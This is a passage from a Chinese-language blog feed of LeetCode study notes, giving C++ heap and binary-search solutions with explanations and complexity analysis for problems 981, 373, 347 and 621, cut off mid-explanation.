class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">    <span class="type">int</span> mid = left + (right - left) /<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(umap[key][mid].second &gt; timestamp)&#123;</span><br><span class="line">        right = mid<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (umap[key][mid].second &lt;= timestamp)&#123;</span><br><span class="line">        returnString = umap[key][mid].first;</span><br><span class="line">        left = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊一旦發現中間值的 timestamp 比input的 timestamp值大，那就需要收窄 <code>right</code>，而如果中間值的 timestamp 比input的 timestamp值小，代表我們在正確的範圍，需要持續收窄 <code>left</code> 並且將 <code>returnString</code> 指定為 value (<code>umap[key][mid].first</code>) 步驟持續直到搜索完畢，最後回傳 <code>returnString</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/981/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度 $O(LogN)$</p><p>空間複雜度 $O(N)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尋找 K 對最小總和 | Medium | LeetCode#373. Find K Pairs with Smallest Sums</title>
      <link href="/posts/Infinity.html"/>
      <url>/posts/Infinity.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/373/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定兩個陣列 <code>nums1</code> 以及 <code>nums2</code>，兩者都以 non-decreasing order 排序，並且給定整數 <code>k</code>，題目要求你從兩個陣列中個取出一個整數，定義成 pair <code>(u, v)</code> 請找出 <code>k</code> 具有最小總和的 pair  <code>u1, v1), (u2, v2), ..., (uk, vk)</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法比較暴力一點，一共三步：</p><ol><li>兩個陣列都各自迭代找出所有 pair 組合</li><li>定義 minHeap 和 comparator 來比較pair之間誰的總和比較小</li><li>pop k 次</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">kSmallestPairs</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; resultPairs;</span><br><span class="line">        <span class="comment">//define heap</span></span><br><span class="line">        <span class="keyword">auto</span> comparator = [](<span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;leftPair, <span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;rightPair)&#123;</span><br><span class="line">            <span class="type">int</span> sumLeft = leftPair.first +  leftPair.second;</span><br><span class="line">            <span class="type">int</span> sumRight = rightPair.first + rightPair.second;</span><br><span class="line">            <span class="keyword">return</span> sumLeft &gt; sumRight;</span><br><span class="line">        &#125;;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(comparator)&gt; <span class="built_in">minHeap</span>(comparator);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// form the pairs</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nums1.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;nums2.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                <span class="comment">// vecPairs.push_back(&#123;nums1[i], nums2[j]&#125;);</span></span><br><span class="line">                minHeap.<span class="built_in">push</span>(&#123;nums1[i],nums2[j]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pop k times</span></span><br><span class="line">        <span class="keyword">while</span>(!minHeap.<span class="built_in">empty</span>() &amp;&amp; k&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            resultPairs.<span class="built_in">push_back</span>(&#123;minHeap.<span class="built_in">top</span>().first, minHeap.<span class="built_in">top</span>().second&#125;);</span><br><span class="line">            minHeap.<span class="built_in">pop</span>();</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resultPairs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>這是原先寫的方法，但這種方法絕對爆炸，因為會找出 <code>nums1.size() * nums2.size()</code> 個pairs 記憶體一定炸開，會Memory Limit Exceeded </p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">kSmallestPairs</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; resultPairs;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//define heap</span></span><br><span class="line">        <span class="keyword">auto</span> comparator = [&amp;](<span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;leftPair, <span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;rightPair)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> sumLeft = (<span class="type">long</span> <span class="type">long</span>)(nums1[leftPair.first] +  nums2[leftPair.second]);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> sumRight = (<span class="type">long</span> <span class="type">long</span>)(nums1[rightPair.first] + nums2[rightPair.second]);</span><br><span class="line">            <span class="keyword">return</span> sumLeft &gt; sumRight;</span><br><span class="line">        &#125;;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(comparator)&gt; <span class="built_in">minHeap</span>(comparator);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// form the pairs</span></span><br><span class="line">        <span class="type">int</span> limit = <span class="built_in">min</span>((<span class="type">int</span>)nums1.<span class="built_in">size</span>(), k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;limit; i++)&#123;</span><br><span class="line">            minHeap.<span class="built_in">push</span>(&#123;i,<span class="number">0</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!minHeap.<span class="built_in">empty</span>() &amp;&amp; k--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">auto</span> [i, j] = minHeap.<span class="built_in">top</span>();</span><br><span class="line">            minHeap.<span class="built_in">pop</span>();</span><br><span class="line">            resultPairs.<span class="built_in">push_back</span>(&#123;nums1[i],nums2[j]&#125;);</span><br><span class="line">            <span class="keyword">if</span> (j + <span class="number">1</span> &lt; (<span class="type">int</span>)nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                minHeap.<span class="built_in">push</span>(&#123;i, j + <span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultPairs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面這是後來改良的做法，大致流程一樣，但是這次不先算出所有 pairs，而是以隊伍的概念來進行：</p><ul><li>每條隊伍只先派 <strong>第一個學生</strong>來參加比賽（即 <code>(i,0)</code>）</li><li>用minHeap決定哪個學生的總分最小，就把他選出來</li><li>被選出來的隊伍 (推入 <code>resultPairs</code>)，才再派下一個學生 <code>(i, j+1)</code> 出來。</li><li>重複這個動作 k 次。</li></ul><p>而這樣做的前提在於題目有說這兩個陣列都是排序好的，並且 heap 的comparator 會是以sum值作為比較基準，也就是說，每條隊伍都按照* *和大小**從小到大排好（因為 <code>nums2</code> 是排序的，所以 <code>(i,0)</code> 最小，<code>(i,1)</code> 第二小 …）</p><blockquote><p>這樣改良的做法就可以降低heap的負擔，原先需要放 m*n個pair 現在只需要 <code>min(k, nums1.size())</code> 個元素</p></blockquote><h3 id="舉例"><a href="#舉例" class="headerlink" title="舉例"></a>舉例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1,7,11]</span><br><span class="line">nums2 = [2,4,6]</span><br><span class="line">k = 3</span><br></pre></td></tr></table></figure><ul><li>初始化： heap 裡有 <code>(1,2)</code>、<code>(7,2)</code>、<code>(11,2)</code></li><li>第一次 pop → <code>(1,2)</code> → 加入答案 → 推 <code>(1,4)</code></li><li>第二次 pop → <code>(1,4)</code> → 加入答案 → 推 <code>(1,6)</code></li><li>第三次 pop → <code>(1,6)</code> → 加入答案 → 推 <code>(1, 沒有了)</code></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/373/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(klog min(k,∣nums1∣))$</p><p>空間複雜度<br>$O(k+min(k,∣nums1∣))$ &#x3D;  $O(k)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Top k 個頻繁元素 | Medium | LeetCode#347. Top K Frequent Elements</title>
      <link href="/posts/483906dc.html"/>
      <url>/posts/483906dc.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/347/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個整數陣列 <code>nums</code> 以及整數 <code>k</code> 並回傳 <code>nums</code> 中 <code>k</code> 個出現最頻繁的元素，你可以以任意順序回傳答案</li></ul><p>本題限制</p><blockquote><p><code>1 &lt;= nums.length &lt;= 105</code><br><code>1 &lt;= k &lt;= nums.length</code></p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>看到這種前 <code>k</code> 個，<code>k</code>個最頻繁，十有八九最佳解會是用 priority queue 去解</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numCount</span><span class="params">(<span class="number">20001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="comment">//store the frequency of each number</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n: nums)&#123;</span><br><span class="line">            numCount[n+<span class="number">10000</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> comparator = [](pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;leftPair, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp;rightPair)&#123;</span><br><span class="line">            <span class="keyword">return</span> leftPair.second &lt; rightPair.second;</span><br><span class="line">        &#125;;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(comparator)&gt; <span class="built_in">freqHeap</span>(comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//push to heap</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numCount.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(numCount[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">// since the first element of the pair is the number itself, we need to convert it back</span></span><br><span class="line">                freqHeap.<span class="built_in">push</span>(&#123;i<span class="number">-10000</span>, numCount[i]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span>(!freqHeap.<span class="built_in">empty</span>() &amp;&amp; k&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(freqHeap.<span class="built_in">top</span>().first);</span><br><span class="line">            freqHeap.<span class="built_in">pop</span>();</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h3><p>這題的 <code>nums</code> 範圍限制在 <code>-10000</code> 到 <code>10000</code>，所以整體數字數量並不大，最多 20001 種可能。<br>基於這個前提，我的解法流程如下：</p><ol><li><p>統計出現頻率<br>建立一個大小為 <code>20001</code> 的陣列 <code>numCount</code>，利用 index 代表數字本身。因為數字可能為負數，所以我把數字 n mapping成 n+10000，保證 index 為正整數</p></li><li><p>丟入max heap<br>每個數字與它的出現次數組合成一個 <code>pair&lt;int,int&gt;</code>，放進 priority queue。 C++ STL 的 <code>priority_queue</code> 預設是 max heap，但它針對 pair 型別的預設排序並不是 <strong>依照第二個元素</strong>。 所以我自訂了一個比較器 <code>comparator</code>，讓它專門比較 <code>pair.second</code>，也就是「出現次數」。</p></li></ol><blockquote><p><code>decltype(comparator)</code> 的作用是自動推導 lambda 的型別，這樣才能把它當成參數傳給 priority_queue</p></blockquote><ol start="3"><li>取出前 k 個元素<br>從max heap中 pop 出來的元素，會依照出現頻率由大到小排列。 我們只要取出前 k 個就能得到答案。</li></ol><blockquote><p>這邊的lambda寫法可以參考這篇：<a href="https://notes.boshkuo.com/docs/C++/STL/priority_queue">https://notes.boshkuo.com/docs/C++/STL/priority_queue</a></p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/347/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(mlogm)$，m 最壞狀況會是 20001，取出前 k 個會是 $(klogm)$，建立頻率表會是 $O(n)$ 所以嚴格來說應該會是 $O(n + mlogm)$</p><p>空間複雜度: $O(m)$, m 為priority queue 最多塞m個元素</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任務排程器 | Medium | LeetCode#621. Task Scheduler</title>
      <link href="/posts/766819da.html"/>
      <url>/posts/766819da.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/621/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：題目給了一個陣列 <code>tasks</code> 裡面有許多不同中類的任務要丟給CPU執行，任務種類有 A~Z，每個 CPU Interval 可以選擇執行完成一個任務或者空閒。任務可以以任何順序執行，但有個條件 <strong>任何兩個相同種類的任務，執行時需要相隔 <code>n</code> 個 intervals</strong> ， 請回傳完成所有任務時，CPU所需的最少 intervals。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始比較偏向暴力去解，就是宣告一個 hash table 來儲存每個任務類型的剩餘等待間隔為多少，透過遞迴去找最小intervals 解，但這樣容易 TLE，並且這樣的做法沒有考慮到 <strong>到底要不要放idle</strong> 這件事。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; taskCount = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;E&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;F&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;H&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;I&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;J&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;K&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;M&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;N&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;O&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;P&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;Q&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;S&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;T&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;U&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;W&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;Y&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;Z&#x27;</span>,<span class="number">0</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;<span class="type">char</span>&gt;&amp; tasks, <span class="type">int</span> index, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index == tasks.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(taskCount[tasks[index]] == <span class="number">0</span>)&#123;</span><br><span class="line">            taskCount[tasks[index]] = n; </span><br><span class="line">            res = <span class="built_in">min</span>(res, <span class="number">1</span> + <span class="built_in">helper</span>(tasks, index+<span class="number">1</span>, n));</span><br><span class="line">            taskCount[tasks[index]] = <span class="number">0</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            taskCount[tasks[index]]--;</span><br><span class="line">            res = <span class="built_in">min</span>(res, <span class="number">1</span> + <span class="built_in">helper</span>(tasks, index+<span class="number">1</span>, n));</span><br><span class="line">            taskCount[tasks[index]]++; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">leastInterval</span><span class="params">(vector&lt;<span class="type">char</span>&gt;&amp; tasks, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(tasks, <span class="number">0</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">leastInterval</span><span class="params">(vector&lt;<span class="type">char</span>&gt;&amp; tasks, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>&gt; maxHeap;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">charCount</span><span class="params">(<span class="number">26</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c: tasks)&#123;</span><br><span class="line">            charCount[c-<span class="string">&#x27;A&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(charCount.<span class="built_in">begin</span>(), charCount.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;charCount.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(charCount[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                maxHeap.<span class="built_in">push</span>(charCount[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> intervals=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!maxHeap.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">            <span class="type">int</span> cycle = n+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(cycle&gt;<span class="number">0</span> &amp;&amp; !maxHeap.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="type">int</span> count = maxHeap.<span class="built_in">top</span>();</span><br><span class="line">                <span class="keyword">if</span>(count<span class="number">-1</span> &gt; <span class="number">0</span> )temp.<span class="built_in">push_back</span>(count<span class="number">-1</span>);</span><br><span class="line">                maxHeap.<span class="built_in">pop</span>();</span><br><span class="line">                intervals++;</span><br><span class="line">                cycle--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> t: temp)&#123;</span><br><span class="line">                maxHeap.<span class="built_in">push</span>(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//pedding idles</span></span><br><span class="line">            <span class="keyword">if</span> (!maxHeap.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                intervals += cycle;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intervals;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其實另外的做法就是透過 Piritory Queue去解，舉體思路如下：</p><ol><li>先算出字母頻率，然後放入 maxHeap (最多的任務放最上面)</li><li>每一輪最多可以排 <code>n+1</code> 個不同任務：<ul><li>從 heap 拿出最多的任務，執行一次（<code>count--</code>）</li><li>若該任務還有剩餘次數，就暫存在一個 <code>temp</code> 陣列裡，等這輪結束再放回 heap</li></ul></li><li>一輪最多跑 <code>n+1</code> 步，如果這輪沒把 heap 清空 → 要補上 idle</li><li>重複直到 heap 清空</li></ol><blockquote><p><strong>這裡解釋為何要用 maxHeap:</strong><br>先把頻率高的任務拿出來排，等於把它們當「骨架」分佈在時間軸上。每次排完某任務就會有一段長度為 <code>n</code> 的冷卻「空隙」，這些空隙能被頻率較低的任務塞進去。越早把高頻任務鋪開，越多空隙能被其他任務填滿，idle 就越少，intervals 